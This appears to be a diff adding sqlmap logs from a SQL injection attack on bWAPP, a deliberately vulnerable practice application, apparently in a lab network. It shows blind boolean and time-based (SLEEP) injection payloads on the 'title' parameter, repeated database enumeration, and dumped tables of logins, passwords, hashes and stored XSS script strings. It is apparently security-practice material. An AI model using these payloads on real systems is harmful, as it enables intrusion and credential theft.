+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=<script>alert()/script>' OR NOT 2016=2016-- FDMd&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=<script>alert()/script>' AND (SELECT 1622 FROM (SELECT(SLEEP(5)))Dwty)-- SObp&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+Database: bWAPP
+[5 tables]
++---------------------------------------+
+| blog                                  |
+| heroes                                |
+| movies                                |
+| users                                 |
+| visitors                              |
++---------------------------------------+
+
+Database: mysql
+[17 tables]
++---------------------------------------+
+| host                                  |
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| func                                  |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| proc                                  |
+| procs_priv                            |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+
+
+Database: information_schema
+[17 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| KEY_COLUMN_USAGE                      |
+| PROFILING                             |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+Database: drupageddon
+[73 tables]
++---------------------------------------+
+| block                                 |
+| cache                                 |
+| comment                               |
+| filter                                |
+| history                               |
+| role                                  |
+| system                                |
+| actions                               |
+| authmap                               |
+| batch                                 |
+| block_custom                          |
+| block_node_type                       |
+| block_role                            |
+| blocked_ips                           |
+| cache_block                           |
+| cache_bootstrap                       |
+| cache_field                           |
+| cache_filter                          |
+| cache_form                            |
+| cache_image                           |
+| cache_menu                            |
+| cache_page                            |
+| cache_path                            |
+| date_format_locale                    |
+| date_format_type                      |
+| date_formats                          |
+| field_config                          |
+| field_config_instance                 |
+| field_data_body                       |
+| field_data_comment_body               |
+| field_data_field_image                |
+| field_data_field_tags                 |
+| field_revision_body                   |
+| field_revision_comment_body           |
+| field_revision_field_image            |
+| field_revision_field_tags             |
+| file_managed                          |
+| file_usage                            |
+| filter_format                         |
+| flood                                 |
+| image_effects                         |
+| image_styles                          |
+| menu_custom                           |
+| menu_links                            |
+| menu_router                           |
+| node                                  |
+| node_access                           |
+| node_comment_statistics               |
+| node_revision                         |
+| node_type                             |
+| queue                                 |
+| rdf_mapping                           |
+| registry                              |
+| registry_file                         |
+| role_permission                       |
+| search_dataset                        |
+| search_index                          |
+| search_node_links                     |
+| search_total                          |
+| semaphore                             |
+| sequences                             |
+| sessions                              |
+| shortcut_set                          |
+| shortcut_set_users                    |
+| taxonomy_index                        |
+| taxonomy_term_data                    |
+| taxonomy_term_hierarchy               |
+| taxonomy_vocabulary                   |
+| url_alias                             |
+| users                                 |
+| users_roles                           |
+| variable                              |
+| watchdog                              |
++---------------------------------------+
+
+Database: bWAPP
+Table: blog
+[0 entries]
++----+-------+--------+---------+
+| id | entry | date   | owner   |
++----+-------+--------+---------+
++----+-------+--------+---------+
+
+Database: bWAPP
+Table: heroes
+[6 entries]
++----+-----------+---------------------------------------+----------------+
+| id | login     | secret                                | password       |
++----+-----------+---------------------------------------+----------------+
+| 1  | neo       | Oh why didn't I took that BLACK pill? | trinity        |
+| 2  | alice     | There's a cure!                       | loveZombies    |
+| 3  | thor      | Oh, no... this is Earth... isn't it?  | Asgard         |
+| 4  | wolverine | What's a Magneto?                     | Log@N          |
+| 5  | johnny    | I'm the Ghost Rider!                  | m3ph1st0ph3l3s |
+| 6  | seline    | It wasn't the Lycans. It was you.     | m00n           |
++----+-----------+---------------------------------------+----------------+
+
+Database: bWAPP
+Table: visitors
+[9 entries]
++----+---------------------+----------------+---------------------------------------------------------------------------------------------------------------------+
+| id | date                | ip_address     | user_agent                                                                                                          |
++----+---------------------+----------------+---------------------------------------------------------------------------------------------------------------------+
+| 1  | 2023-06-19 21:20:55 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
+| 2  | 2023-06-19 21:23:40 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
+| 3  | 2023-06-19 21:24:21 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
+| 4  | 2023-06-19 21:28:12 | 192.168.56.101 | <script>var currentDomain = window.location.hostname;                                                               |
+| 5  | 2023-06-19 21:28:31 | 192.168.56.101 | <script>var currentDomain = window.location.hostname;                                                               |
+| 6  | 2023-06-19 21:34:12 | 192.168.56.101 | <script>var currentDomain = window.location.hostname;                                                               |
+| 7  | 2023-06-19 21:37:39 | 192.168.56.101 | <script>var currentDomain = window.location.hostname; alert(">B>G=89 4><5=: " + currentDomain);</script>           |
+| 8  | 2023-06-19 21:39:43 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
+| 9  | 2023-06-19 21:41:14 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
++----+---------------------+----------------+---------------------------------------------------------------------------------------------------------------------+
+
+Database: bWAPP
+Table: movies
+[10 entries]
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+| id | imdb      | genre  | title                    | release_year | tickets_stock | main_character  |
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+| 1  | tt1583421 | action | G.I. Joe: Retaliation    | 2013         | 100           | Cobra Commander |
+| 2  | tt0371746 | action | Iron Man                 | 2008         | 53            | Tony Stark      |
+| 3  | tt0770828 | action | Man of Steel             | 2013         | 78            | Clark Kent      |
+| 4  | tt0438488 | sci-fi | Terminator Salvation     | 2009         | 100           | John Connor     |
+| 5  | tt0948470 | action | The Amazing Spider-Man   | 2012         | 13            | Peter Parker    |
+| 6  | tt1259521 | horror | The Cabin in the Woods   | 2011         | 666           | Some zombies    |
+| 7  | tt1345836 | action | The Dark Knight Rises    | 2012         | 3             | Bruce Wayne     |
+| 8  | tt0232500 | action | The Fast and the Furious | 2001         | 40            | Brian O'Connor  |
+| 9  | tt0800080 | action | The Incredible Hulk      | 2008         | 23            | Bruce Banner    |
+| 10 | tt0816711 | horror | World War Z              | 2013         | 0             | Gerry Lane      |
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+
+Database: bWAPP
+Table: users
+[2 entries]
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+| id | email                    | login  | secret                              | admin   | activated | password                                       | reset_code | activation_code |
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+| 1  | bwapp-aim@mailinator.com | A.I.M. | A.I.M. or Authentication Is Missing | 1       | 1         | 6885858486f31043e5839c735d99457f045affd0 (bug) | NULL       | NULL            |
+| 2  | bwapp-bee@mailinator.com | bee    | Any bugs?                           | 1       | 1         | 6885858486f31043e5839c735d99457f045affd0 (bug) | NULL       | NULL            |
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=<script>alert()/script>' OR NOT 2016=2016-- FDMd&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=<script>alert()/script>' AND (SELECT 1622 FROM (SELECT(SLEEP(5)))Dwty)-- SObp&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 5.0.12
+Database: bWAPP
+[5 tables]
++---------------------------------------+
+| blog                                  |
+| heroes                                |
+| movies                                |
+| users                                 |
+| visitors                              |
++---------------------------------------+
+
+Database: information_schema
+[17 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| KEY_COLUMN_USAGE                      |
+| PROFILING                             |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+Database: drupageddon
+[73 tables]
++---------------------------------------+
+| block                                 |
+| cache                                 |
+| comment                               |
+| filter                                |
+| history                               |
+| role                                  |
+| system                                |
+| actions                               |
+| authmap                               |
+| batch                                 |
+| block_custom                          |
+| block_node_type                       |
+| block_role                            |
+| blocked_ips                           |
+| cache_block                           |
+| cache_bootstrap                       |
+| cache_field                           |
+| cache_filter                          |
+| cache_form                            |
+| cache_image                           |
+| cache_menu                            |
+| cache_page                            |
+| cache_path                            |
+| date_format_locale                    |
+| date_format_type                      |
+| date_formats                          |
+| field_config                          |
+| field_config_instance                 |
+| field_data_body                       |
+| field_data_comment_body               |
+| field_data_field_image                |
+| field_data_field_tags                 |
+| field_revision_body                   |
+| field_revision_comment_body           |
+| field_revision_field_image            |
+| field_revision_field_tags             |
+| file_managed                          |
+| file_usage                            |
+| filter_format                         |
+| flood                                 |
+| image_effects                         |
+| image_styles                          |
+| menu_custom                           |
+| menu_links                            |
+| menu_router                           |
+| node                                  |
+| node_access                           |
+| node_comment_statistics               |
+| node_revision                         |
+| node_type                             |
+| queue                                 |
+| rdf_mapping                           |
+| registry                              |
+| registry_file                         |
+| role_permission                       |
+| search_dataset                        |
+| search_index                          |
+| search_node_links                     |
+| search_total                          |
+| semaphore                             |
+| sequences                             |
+| sessions                              |
+| shortcut_set                          |
+| shortcut_set_users                    |
+| taxonomy_index                        |
+| taxonomy_term_data                    |
+| taxonomy_term_hierarchy               |
+| taxonomy_vocabulary                   |
+| url_alias                             |
+| users                                 |
+| users_roles                           |
+| variable                              |
+| watchdog                              |
++---------------------------------------+
+
+Database: mysql
+[17 tables]
++---------------------------------------+
+| host                                  |
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| func                                  |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| proc                                  |
+| procs_priv                            |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+
+
+Database: bWAPP
+Table: movies
+[10 entries]
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+| id | imdb      | genre  | title                    | release_year | tickets_stock | main_character  |
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+| 1  | tt1583421 | action | G.I. Joe: Retaliation    | 2013         | 100           | Cobra Commander |
+| 2  | tt0371746 | action | Iron Man                 | 2008         | 53            | Tony Stark      |
+| 3  | tt0770828 | action | Man of Steel             | 2013         | 78            | Clark Kent      |
+| 4  | tt0438488 | sci-fi | Terminator Salvation     | 2009         | 100           | John Connor     |
+| 5  | tt0948470 | action | The Amazing Spider-Man   | 2012         | 13            | Peter Parker    |
+| 6  | tt1259521 | horror | The Cabin in the Woods   | 2011         | 666           | Some zombies    |
+| 7  | tt1345836 | action | The Dark Knight Rises    | 2012         | 3             | Bruce Wayne     |
+| 8  | tt0232500 | action | The Fast and the Furious | 2001         | 40            | Brian O'Connor  |
+| 9  | tt0800080 | action | The Incredible Hulk      | 2008         | 23            | Bruce Banner    |
+| 10 | tt0816711 | horror | World War Z              | 2013         | 0             | Gerry Lane      |
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+
+Database: bWAPP
+Table: blog
+[0 entries]
++----+-------+--------+---------+
+| id | entry | date   | owner   |
++----+-------+--------+---------+
++----+-------+--------+---------+
+
+Database: bWAPP
+Table: users
+[2 entries]
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+| id | email                    | login  | secret                              | admin   | activated | password                                       | reset_code | activation_code |
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+| 1  | bwapp-aim@mailinator.com | A.I.M. | A.I.M. or Authentication Is Missing | 1       | 1         | 6885858486f31043e5839c735d99457f045affd0 (bug) | NULL       | NULL            |
+| 2  | bwapp-bee@mailinator.com | bee    | Any bugs?                           | 1       | 1         | 6885858486f31043e5839c735d99457f045affd0 (bug) | NULL       | NULL            |
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+
+Database: bWAPP
+Table: heroes
+[6 entries]
++----+-----------+---------------------------------------+----------------+
+| id | login     | secret                                | password       |
++----+-----------+---------------------------------------+----------------+
+| 1  | neo       | Oh why didn't I took that BLACK pill? | trinity        |
+| 2  | alice     | There's a cure!                       | loveZombies    |
+| 3  | thor      | Oh, no... this is Earth... isn't it?  | Asgard         |
+| 4  | wolverine | What's a Magneto?                     | Log@N          |
+| 5  | johnny    | I'm the Ghost Rider!                  | m3ph1st0ph3l3s |
+| 6  | seline    | It wasn't the Lycans. It was you.     | m00n           |
++----+-----------+---------------------------------------+----------------+
+
+Database: bWAPP
+Table: visitors
+[9 entries]
++----+---------------------+----------------+---------------------------------------------------------------------------------------------------------------------+
+| id | date                | ip_address     | user_agent                                                                                                          |
++----+---------------------+----------------+---------------------------------------------------------------------------------------------------------------------+
+| 1  | 2023-06-19 21:20:55 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
+| 2  | 2023-06-19 21:23:40 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
+| 3  | 2023-06-19 21:24:21 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
+| 4  | 2023-06-19 21:28:12 | 192.168.56.101 | <script>var currentDomain = window.location.hostname;                                                               |
+| 5  | 2023-06-19 21:28:31 | 192.168.56.101 | <script>var currentDomain = window.location.hostname;                                                               |
+| 6  | 2023-06-19 21:34:12 | 192.168.56.101 | <script>var currentDomain = window.location.hostname;                                                               |
+| 7  | 2023-06-19 21:37:39 | 192.168.56.101 | <script>var currentDomain = window.location.hostname; alert(">B>G=89 4><5=: " + currentDomain);</script>           |
+| 8  | 2023-06-19 21:39:43 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
+| 9  | 2023-06-19 21:41:14 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
++----+---------------------+----------------+---------------------------------------------------------------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=sad' AND (SELECT 4796 FROM (SELECT(SLEEP(5)))KOsf) AND 'sJBU'='sJBU&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+Database: drupageddon
+[73 tables]
++---------------------------------------+
+| block                                 |
+| cache                                 |
+| comment                               |
+| filter                                |
+| history                               |
+| role                                  |
+| system                                |
+| actions                               |
+| authmap                               |
+| batch                                 |
+| block_custom                          |
+| block_node_type                       |
+| block_role                            |
+| blocked_ips                           |
+| cache_block                           |
+| cache_bootstrap                       |
+| cache_field                           |
+| cache_filter                          |
+| cache_form                            |
+| cache_image                           |
+| cache_menu                            |
+| cache_page                            |
+| cache_path                            |
+| date_format_locale                    |
+| date_format_type                      |
+| date_formats                          |
+| field_config                          |
+| field_config_instance                 |
+| field_data_body                       |
+| field_data_comment_body               |
+| field_data_field_image                |
+| field_data_field_tags                 |
+| field_revision_body                   |
+| field_revision_comment_body           |
+| field_revision_field_image            |
+| field_revision_field_tags             |
+| file_managed                          |
+| file_usage                            |
+| filter_format                         |
+| flood                                 |
+| image_effects                         |
+| image_styles                          |
+| menu_custom                           |
+| menu_links                            |
+| menu_router                           |
+| node                                  |
+| node_access                           |
+| node_comment_statistics               |
+| node_revision                         |
+| node_type                             |
+| queue                                 |
+| rdf_mapping                           |
+| registry                              |
+| registry_file                         |
+| role_permission                       |
+| search_dataset                        |
+| search_index                          |
+| search_node_links                     |
+| search_total                          |
+| semaphore                             |
+| sequences                             |
+| sessions                              |
+| shortcut_set                          |
+| shortcut_set_users                    |
+| taxonomy_index                        |
+| taxonomy_term_data                    |
+| taxonomy_term_hierarchy               |
+| taxonomy_vocabulary                   |
+| url_alias                             |
+| users                                 |
+| users_roles                           |
+| variable                              |
+| watchdog                              |
++---------------------------------------+
+
+Database: information_schema
+[17 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| KEY_COLUMN_USAGE                      |
+| PROFILING                             |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+Database: bWAPP
+[5 tables]
++---------------------------------------+
+| blog                                  |
+| heroes                                |
+| movies                                |
+| users                                 |
+| visitors                              |
++---------------------------------------+
+
+Database: mysql
+[17 tables]
++---------------------------------------+
+| host                                  |
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| func                                  |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| proc                                  |
+| procs_priv                            |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+
+
+Database: bWAPP
+Table: users
+[2 entries]
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+| id | email                    | login  | secret                              | admin   | activated | password                                       | reset_code | activation_code |
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+| 1  | bwapp-aim@mailinator.com | A.I.M. | A.I.M. or Authentication Is Missing | 1       | 1         | 6885858486f31043e5839c735d99457f045affd0 (bug) | NULL       | NULL            |
+| 2  | bwapp-bee@mailinator.com | bee    | Any bugs?                           | 1       | 1         | 6885858486f31043e5839c735d99457f045affd0 (bug) | NULL       | NULL            |
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+
